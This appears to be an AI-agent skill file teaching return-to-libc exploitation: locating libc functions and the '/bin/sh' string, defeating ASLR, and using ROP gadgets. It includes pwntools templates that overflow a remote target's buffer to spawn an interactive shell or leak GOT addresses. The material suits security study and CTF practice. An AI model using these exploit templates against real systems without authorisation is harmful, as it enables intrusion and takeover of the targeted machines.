---
name: ret2lib-exploitation
description: How to perform ret2lib attacks on vulnerable binaries. Use this skill whenever the user mentions ret2lib, return-to-libc, libc exploitation, calling system/execve from libc, bypassing NX with library functions, or needs to craft ROP chains to call libc functions. This skill covers finding libc addresses, handling ASLR, using one-gadget, and architecture-specific considerations (x86, x64, ARM64).
---

# Ret2Lib Exploitation

Ret2Lib (Return-to-Libc) redirects execution flow to functions in shared libraries like `libc.so` instead of executing shellcode on the stack. This bypasses NX (non-executable stack) protections.

## Core Concept

1. **Find target function** in libc (e.g., `system`, `execve`, `printf`)
2. **Find argument data** in libc (e.g., `/bin/sh` string)
3. **Craft ROP chain** to set up arguments per calling convention
4. **Overflow buffer** to redirect execution to the function

## Finding Libc Addresses

### Method 1: Using `ldd`

```bash
# Find where libc is loaded
ldd /path/to/binary | grep libc.so.6

# Check if ASLR randomizes libc (run multiple times)
for i in {1..5}; do ldd ./binary | grep libc; done
```

### Method 2: Using `readelf` for function offsets

```bash
# Find system function offset
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system

# Find /bin/sh string offset
strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
```

### Method 3: Using GDB with PEDA/GEF

```bash
gdb ./binary
# After running the binary
p system          # Address of system
p exit            # Address of exit
find "/bin/sh"    # Find /bin/sh string
```

### Method 4: Using `/proc/<PID>/maps`

For network servers or child processes:

```bash
# Read memory maps (may need root)
cat /proc/<PID>/maps | grep libc

# The first address shown is the libc base address
# Example: 0xb75dc000 is the base
```

## Unknown Libc Version

When you don't know which libc the binary uses:

### Option 1: Leak addresses and identify

1. Exploit the vulnerability to leak a libc function address
2. Use [libc.blukat.me](https://libc.blukat.me/) with 2 function addresses to identify the version
3. Download the matching libc and calculate offsets

### Option 2: Use pwntools template

See `rop-leaking-libc-template.md` for automated libc identification.

## Bypassing ASLR

### 32-bit Systems (Brute Force)

**Local attacks:**
```python
for off in range(0xb7000000, 0xb8000000, 0x1000):
    # Try each possible libc base address
```

**Remote attacks:**
```python
# Brute-force usleep address with argument 10
# If server delays 10 seconds, you found the address
```

### 64-bit Systems

ASLR brute force is impractical. Instead:
1. **Leak a libc address** first (via GOT, format string, etc.)
2. **Calculate offsets** from leaked address
3. **Use the calculated addresses** in your exploit

## One-Gadget

For simpler exploitation, use one-gadget addresses that spawn a shell with a single jump:

```bash
# Find one-gadget addresses for your libc
one_gadget /lib/x86_64-linux-gnu/libc.so.6

# Example output:
# 0x45216 : execve("/bin/sh", ["/bin/sh"], ["/bin/sh"])
```

## Architecture-Specific Considerations

### x86 (32-bit)

- Arguments passed on stack (right-to-left)
- Use `p32()` in pwntools
- Stack grows downward

**Example payload structure:**
```
[padding][system_addr][exit_addr][binsh_addr]
```

### x64 (64-bit)

- First 6 arguments in registers: RDI, RSI, RDX, RCX, R8, R9
- Need ROP gadgets to set registers
- Use `p64()` in pwntools

**Common gadgets:**
- `pop rdi; ret` - set first argument
- `pop rsi; ret` - set second argument
- `pop rdx; ret` - set third argument

### ARM64

- `ret` jumps to X30 register, not stack pointer
- Cannot jump mid-instruction
- More complex ROP chains required
- See `ret2lib-+-printf-leak-arm64.md` for examples

## Common Attack Patterns

### Pattern 1: Basic Ret2Lib

```python
from pwn import *

# Connect to target
p = remote('target', port)

# Find addresses
libc_base = 0xb75dc000  # From /proc/maps or leak
system_addr = libc_base + 0x3cb20
binsh_addr = libc_base + 0x1388da

# Craft payload
payload = b'A' * offset  # Fill buffer to overwrite return address
payload += p32(system_addr)
payload += p32(0xdeadbeef)  # Return address after system (can be exit or garbage)
payload += p32(binsh_addr)  # First argument to system

# Send exploit
p.sendline(payload)
p.interactive()
```

### Pattern 2: Ret2Printf (Leak Address)

```python
# Leak libc address by calling printf with GOT entry as argument
payload = b'A' * offset
payload += p32(printf_addr)
payload += p32(puts_got_addr)  # Address of puts in GOT

# Receive leaked address
leaked = u32(p.recv(4))
libc_base = leaked - puts_offset
```

### Pattern 3: Ret2Printf Format String

Combine ret2lib with format string vulnerability:

```python
# Use ret2lib to call printf with format string arguments
# This transforms ret2lib into a format string exploit
```

## Debugging Tips

### Verify libc base address

```bash
# In GDB
info proc mappings
# Look for libc.so.6 entry
```

### Check if ASLR is enabled

```bash
cat /proc/sys/kernel/randomize_va_space
# 0 = disabled, 1 = conservative, 2 = full
```

### Test locally first

```bash
# Disable ASLR for testing
setarch $(uname -m) -R ./binary
```

## Common Pitfalls

1. **Wrong calling convention** - x86 uses stack, x64 uses registers
2. **Missing null bytes** - `/bin/sh` contains null terminator, use `/bin/sh\x00` or find alternative
3. **ASLR not accounted for** - Always verify if ASLR is enabled
4. **Wrong libc version** - Offsets differ between libc versions
5. **Stack alignment** - Some functions require 16-byte stack alignment

## Tools Checklist

- [ ] `ldd` - Find libc load address
- [ ] `readelf` - Find function offsets
- [ ] `strings` - Find string offsets
- [ ] `gdb` + PEDA/GEF - Debug and find addresses
- [ ] `one_gadget` - Find one-gadget addresses
- [ ] `pwntools` - Craft and send payloads
- [ ] `libc.blukat.me` - Identify libc version

## Next Steps

After basic ret2lib:
1. Learn **ROP chain construction** for complex argument setup
2. Study **format string vulnerabilities** for address leaking
3. Practice **heap exploitation** for advanced scenarios
4. Explore **ARM64 exploitation** for mobile targets
